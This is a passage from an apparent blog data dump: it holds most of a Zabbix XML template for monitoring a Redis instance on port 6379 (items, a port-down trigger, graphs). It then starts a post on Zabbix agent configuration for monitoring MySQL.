&lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Connection rate_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Evicted_keys_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Expired keys_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Last save time_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;3&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units&gt;unixtime&lt;/units&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;port status_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Request rate_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Role_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,role]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;3&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;1&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Uptime in seconds_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,uptime_in_seconds]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units&gt;uptime&lt;/units&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Used memory_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;Used_memory_rss_6379&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;7&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description/&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;Redis_6379&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;/item&gt; &lt;/items&gt; &lt;discovery_rules/&gt; &lt;macros/&gt; &lt;templates/&gt; &lt;screens/&gt; &lt;/template&gt; &lt;/templates&gt; &lt;triggers&gt; &lt;trigger&gt; &lt;expression&gt;{Templates Redis_6379:net.tcp.listen[6379].count(#3,0,&amp;quot;eq&amp;quot;)}=3&lt;/expression&gt; &lt;name&gt;Redis port 6379 is not running&lt;/name&gt; &lt;url/&gt; &lt;status&gt;0&lt;/status&gt; &lt;priority&gt;4&lt;/priority&gt; &lt;description/&gt; &lt;type&gt;0&lt;/type&gt; &lt;dependencies/&gt; &lt;/trigger&gt; &lt;/triggers&gt; &lt;graphs&gt; &lt;graph&gt; &lt;name&gt;Redis key_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,evicted_keys]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,expired_keys]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Last_save_time_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,last_save_time]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Port Connections_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;0&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;EE0000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,blocked_clients]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;BBBB00&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,total_connections_received]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;CC00CC&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,total_commands_processed]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;3&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00CCCC&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,connected_slave]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;4&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;009900&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;4&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,connected_clients]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Port status_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;net.tcp.listen[6379]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Uptime_in_seconds_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,uptime_in_seconds]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;Redis Used memory_6379&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,used_memory:]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C8C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Templates Redis_6379&lt;/host&gt; &lt;key&gt;redis_stats[6379,used_memory_rss]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;/graphs&gt;&lt;/zabbix_export&gt;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"},{"name":"zabbix","slug":"zabbix","permalink":"http://www.wangxin123.com/tags/zabbix/"}]},{"title":"zabbix监控mysql","slug":"zabbix监控mysql","date":"2016-09-29T10:24:17.000Z","updated":"2017-02-13T15:17:33.599Z","comments":true,"path":"2016/09/29/zabbix监控mysql/","link":"","permalink":"http://www.wangxin123.com/2016/09/29/zabbix监控mysql/","excerpt":"zabbix&#x81EA;&#x5E26;mysql&#x76D1;&#x63A7;&#x6A21;&#x677F;&#xFF0C;&#x53EF;&#x76D1;&#x63A7;mysql&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x3001;&#x8BF7;&#x6C42;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x548C;&#x54CD;&#x5E94;&#x6D41;&#x91CF;&#x5E26;&#x5BBD;&#x7B49;&#x3002; &#x76D1;&#x63A7;&#x6B65;&#x9AA4;1&#x3001;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;Server=zabbix_server_IP zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;ServerActive=zabbix_server_IP &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;Hostname=name name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;UnsafeUserParameters=1 &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key 2&#x3001;&#x7F16;&#x5199;check_mysql.sh&#x811A;&#x672C;, 